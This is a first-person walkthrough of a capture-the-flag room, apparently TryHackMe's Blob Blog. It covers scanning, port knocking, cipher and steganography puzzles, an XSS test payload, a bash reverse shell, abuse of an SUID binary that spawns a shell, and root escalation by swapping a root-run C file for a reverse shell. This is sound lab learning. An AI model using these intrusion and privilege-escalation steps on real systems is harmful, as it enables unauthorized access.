
`sudo nmap -sS -p- 10.113.132.75` did not work for me, I had to downgrade to -sT and only top 1000 ports

`nmap -sT 10.113.132.75` - we finally got ports 22 and 80


The webpage is a default ubuntu page, so let's fuzzz it

`dirsearch -u http://10.113.132.75` - nothing came up (only 403s)

to make sure I also let gobuster run for a while with a bigger wordlist, but nothing as well.


Finally, I had the idea to inspect the source code and found a very suspicious string...

`echo "K1stLS0+Kys8XT4rLisrK1stPisrKys8XT4uLS0tLisrKysrKysrKy4tWy0+KysrKys8XT4tLisrKytVERY LONG STRING==" > f.txt`

`base64 -d f.txt` 

```
+[--->++<]>+.+++[->++++<]>.---.+++++++++.-[->+++++<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.-[->+++<]>-.--[--->+<]>--.+[---->+<]>+++.[->+++<]>+.-[->+++<]>.-[--->++<]>+.--.-----.[->+++<]>.------------.+[----->+<]>.--[--->+<]>.-[---->+<]>++.++[->+++<]>.++++++++++++.---------.----.+++++++++.----------.--[--->+<]>---.+[---->+<]>+++.[->+++<]>+.+++++++++++++.----------.-[--->+<]>-.++++[->++<]>+.-[->++++<]>.--[->++++<]>-.--------.++++++.---------.--------.-[--->+<]>-.[->+++<]>+.+++++++++++.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>+.+++.+.------------.++++++++.-[++>---<]>+.+++++[->+++<]>.-.-[->+++++<]>-.++[-->+++<]>.[--->++<]>--.+++++[->+++<]>.---------.[--->+<]>--.+++++[->+++<]>.++++++.---.[-->+++++<]>+++.+[----->+<]>+.---------.++++.--.+.------.+++++++++++++.+++.+.+[---->+<]>+++.+[->+++<]>+.+++++++++++..+++.+.+[++>---<]>.++[--->++<]>..[->++<]>+.[--->+<]>+.+++++++++++.-[->+++<]>-.+[--->+<]>+++.------.+[---->+<]>+++.-[--->++<]>--.+++++++.++++++.--.++++[->+++<]>.[--->+<]>----.+[---->+<]>+++.[-->+++<]>+.-----.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.++[-->+++<]>.-------.------------.---[->++++<]>.------------.---.+++++++++.-[->+++++<]>-.-----[->++<]>-.--[--->++<]>-.
```

well, that's [brainfuck](https://www.dcode.fr/brainfuck-language), decodes as 

When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!

odd numbers or some fibonnaci stuff, but where?

okay, that was a rabbit hole, at the end of the page source code, we find this:

<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->

not a very good friend...

I fiddled around in [CyberChef](https://gchq.github.io/CyberChef/#input=SGNmUDhKNTRBSzQ&oeol=VT), searching for inspiration with Magic

IDK, so I will try [cipher identifier](https://www.dcode.fr/cipher-identifier), which hints at base 62 or 58.

okay, it was base 58 [in cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)&input=SGNmUDhKNTRBSzQ&oeol=VT)

so cUpC4k3s ...for bob ...at 10.113.132.75 ...

`ssh bob@10.113.132.75` - no luck (*_*)

wait, knock? I had to look this up but yes, it is actually a command they want us to run, which "knocks" on ports

`knock 10.113.132.75 1 3 5`

seemingly does nothing, but works like magic:
            

`nmap -sT 10.113.132.75`
```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy
```

I also ran a version scan for the new ports

`nmap -sC -sV -p21,445,8080 10.113.132.75`

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2
445/tcp  open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Unix

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

bob feels like an ftp guy - and I'm right

we got examples.desktop and cool.jpeg

so strings, then steganography stuff hopefully can get us further

okay, examples is just examples and cool.jpeg does not respond to strings,

`exiftool cool.jpeg` - nothing interesting

`steghide info cool.jpeg` - also tried with bob's pass, but nothing

my favourite stego sites

[futureboy](https://futureboy.us/stegano/decode.pl) - nothing  
[aperisolve](https://www.aperisolve.com) - with and without pass - nothing

going back to the sC sV scan, this is weird

```
Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

is it even smb?

`smbclient -L 10.113.132.75`

Protocol negotiation (with timeout 20000 ms) timed out against server 10.113.132.75

`smbmap -H 10.113.132.75`

>[!] Connection error on 10.113.132.75
[*] Established 0 SMB connections(s) and 0 authenticated session(s)

oop, it is http and bob is very silly again, we got another

bob password n.2: p@55w0rd 

still not his ssh password, so back to stego

`steghide extract -sf cool.jpeg`

wrote extracted data to "out.txt".

`cat out.txt`, we get

```
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
```

okay, so username:password and safe folder?

on the fake SMB web, searching for this folder, we get a msg

```
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
```

I feel like its time to dirsearch this web

`dirsearch -u http://10.113.132.75:445`

very well...

[10:01:38] 403 -  290B  - /.htpasswds
[10:01:38] 403 -  291B  - /.httr-oauth                                      
[10:01:56] 403 -  293B  - /server-status                                    
[10:01:56] 403 -  294B  - /server-status/                                   
**[10:01:59] 200 -    3KB - /user**

there is straight up a private openSSH key. Thanks bob!

put it to id_rsa

`chmod 700 id_rsa`

`ssh -i id_rsa bob@10.113.132.75`

```
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Load key "id_rsa": error in libcrypto: unsupported
bob@10.113.132.75's password:
```

very sad, this means the rsa key will probably not help us. I found no "blog" that they were talking about, which must mean...

there is one more web port

`dirsearch -u http://10.113.132.75:8080`

```
[10:07:37] 302 -  219B  - /blog  ->  http://10.113.132.75:8080/login         
[10:07:45] 200 -  546B  - /login                                            
[10:07:51] 302 -  219B  - /review  ->  http://10.113.132.75:8080/login 
```

I tried to login with both bob passwords to no avail. "youmayenter" could be another user. We could possibly try bruteforcing bob and even youmayenter maybe.

I took a step back and realised we hadn't utilised the info found from stego

`zcv:p1fd3v3amT@55n0pr`, which is likely bob:<some_password>, so we can try using this crib to detect cipher, similar to the first base58 one

I found a quite extensive cipher decoder [CacheSleuth](https://www.cachesleuth.com/multidecoder/) but was not able to find it this way

I had to consult chat and am surprised that no tools (i tried about 15 different ones) could establish that it was a variant of vigenere cipher

[entry in cyberchef](https://gchq.github.io/CyberChef/#recipe=Vigen%C3%A8re_Decode('youmayenter')&input=emN2OnAxZmQzdjNhbVRANTVuMHBy) 

okay, now we can access the blog with bob:d1ff3r3ntP@55w0rd

What do you think of my blog? Leave a review below! The latest review can be found here ((link))! ((submission field))

first thing I typed without thinking was <script>alert("xss")</script> and confirmed XSS at the link

I can't believe this, but revshells.com has a JS shell lol, let's try - Nope, and even if, I guess it would be too long though

oh, we can also execute bash, that makes it simpler

>bash -i revshell
>we are www-data
> we can ssh to bob with cUpC4k3s as password

I found nothing interesting in our privilege range, other than /etc/crontab:

*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *

but we need some lateral movement first, so I tried all bob passwords and one of them worked (cUpC4k3s)

Bob had no interesting files, but searching for SUID binaries, we found something irregular

`find / -perm /4000 2>/dev/null`

/usr/bin/blogFeedback

`cd /usr/bin && ls -la blogFeedback` 
-rwsrwxr-x 1 bobloblaw bobloblaw 16768 Jul 25  2020 blogFeedback

wtf does it do though, i do not know.

the intended next step is ghidra reverse engineering the binary (first time here).

I opened the binary in ghidra, let it analyze it on default and then looked at ghidra decompiler's best guess of what the main function does (pseudo C code). I renamed the variables for better readability.

```C
undefined8 main(int param_1,long param_2)

{
  int check;
  int idx;
  
  if ((param_1 < 7) || (7 < param_1)) {
    puts("Order my blogs!");
  }
  else {
    for (idx = 1; idx < 7; idx = idx + 1) {
      check = atoi(*(char **)(param_2 + (long)idx * 8));
      if (check != 7 - idx) {
        puts("Hmm... I disagree!");
        return 0;
      }
    }
    puts("Now that, I can get behind!");
    setreuid(1000,1000);
    system("/bin/sh");
  }
  return 0;
```

atoi = ascii to int (str to int in C)  
puts = print string by a character at a time

the code mostly makes sense, just this part was confusing:

check = atoi(*(char **)(param_2 + (long)idx * 8));

it makes an int out of the adress of param_2 + idx*8, basically going to the next parameter from input


this means we have to give it 6 parameters. The first if statement if just confusing, as we cannot give it 7,6,5...1 because that is 7 args, but we have to start at 6. Well, we got bobloblaw

bob@bobloblaw-VirtualBox:/etc$ `blogFeedback 6 5 4 3 2 1`  
Now that, I can get behind!  
$ `id`  
uid=1000(bobloblaw) gid=1001(bob) groups=1001(bob)  

hooray, now we are not nobody anymore. We get user flag at last. Plus we can finally delete the annoying adware script that was mocking us - big wins.

Most interesting finds:

/home/bobloblaw/Documents/.also_boring/.still_boring  
-rwxr-xr-x 1 root      root      8.3K Nov 21 09:17 .still_boring  
what it is? some 64-bit ELF, will have to use ghidra to get more info

2 jpgs for stego

ghidra:

```c
undefined8 main(void)

{
  puts("You haven\'t rooted me yet? Jeez");
  return 0;
}
```
it was a trick... anyways now we got stego stuff

`steghide extract -sf dontlookatthis.jpg`
Enter passphrase: ((I just clicked enter))
wrote extracted data to "dontlook.txt".

echo "NDkgMjAgNzQgNmYgNmMgNjQgMjAgNzkgNmYgNzUgMjAgNmUgNmYgNzQgMjAgNzQgNmYgMjAgNmMgNmYgNmYgNmIgMjE=" > b.txt

base64 -d b.txt 
49 20 74 6f 6c 64 20 79 6f 75 20 6e 6f 74 20 74 6f 20 6c 6f 6f 6b 21

another trick, this translates to: "I told you not to look!"

the other jpg had binary hidden in it

[in cyberchef](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)From_Base64('A-Za-z0-9%2B%5C%5C-%3D',true,false)

this is brainfuck for:

>The stove's timer is about to go off... there are some other timers too...

`find / -name *stove* 2>/dev/null` - there were no stoves  
`find / -name *timer* 2>/dev/null` - many many timers though (but none of them included stove)

nothing interesting. Is there something running in the background that escaped us? The spammy script would hint towards possibly other things going on...

I succesfully brought over pspy64 (did not think it would be possible) and found... **nothing**.

this was way more suspicious than finding something suspicious...


I learned a valuable lesson. **Do not delete annoying scripts, which seemingly do nothing as they might be privilege escalation vectors later...**

In the [official writeup](https://bobloblaw321.wixsite.com/website/post/tryhackme-blob-blog), root uses the annoying script file (.boring_file.c) to execute C code and then removes the file

i replaced the file with a reverse shell in C, but root never connected... (after restarting the machine, connection was succesful and we got the root flag)

very nice room, definitely not feasible in 75 minutes for me though.


